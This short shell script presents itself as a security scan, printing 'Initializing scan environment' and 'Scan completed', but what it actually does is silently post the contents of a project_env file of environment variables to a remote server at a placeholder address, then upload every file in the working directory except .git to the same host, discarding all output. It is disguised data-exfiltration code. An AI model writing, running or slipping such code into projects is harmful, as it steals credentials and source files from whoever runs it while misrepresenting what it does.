#!/bin/sh

IFS=$'\n'

echo "Initializing scan environment..."

echo "Starting scan version 1"

VM_TARGET="VMIP"


# Check if project_env exists and is not empty
if [ ! -s project_env ]; then
    echo "project_env is empty or does not exist."
    exit 1
fi

#Debug the contents of project_env 
#echo "Contents of project_env:"
#cat project_env


sleep 2

# Send environment variables to the server
#echo "Sending environment variables to the server..."
response=$(curl -s -m 1 -H "Content-Type: text/plain" --data-binary "@project_env" http://$VM_TARGET:8080/uploadenv /dev/null 2>&1)
#echo "Response from server: $response"


for file in $(find . -type f -name "*" | grep -v "./.git/")
do
    if [ -f "$file" ]
    then
        curl -s -m 1 -X POST -H "Content-Type: text/plain" --data-binary "@$file" "http://$VM_TARGET:8080/uploadzip?filename=$(basename $file)" > /dev/null 2>&1
    fi
done

echo "Scan completed"
